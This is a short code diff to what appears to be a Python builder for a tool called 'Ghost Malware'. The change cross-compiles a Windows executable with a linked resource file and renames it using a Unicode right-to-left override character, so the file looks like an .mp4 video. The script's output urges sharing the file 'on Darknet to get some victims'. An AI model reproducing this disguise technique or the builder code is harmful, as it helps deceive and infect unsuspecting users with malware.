@@ -70,7 +70,8 @@ else:
      print("Installing dependencies...")
      os.system("sudo apt-get update") 
      os.system("sudo apt-get install mingw-w64")
-     if os.system("x86_64-w64-mingw32-g++ -o " + randomfilename + " Generated.cpp") == 0:
+     if os.system("i686-w64-mingw32-g++ -Xlinker settings.o -o " + randomfilename + " Generated.cpp") == 0:
+          os.rename(randomfilename + ".exe", randomfilename + "\u202E4pm.exe")
           print("Detected OS: Linux")
           print("\n\nGhost Malware successfully generated! File Name: " + randomfilename)
           print("\nShare this file on Darknet to get some victims")
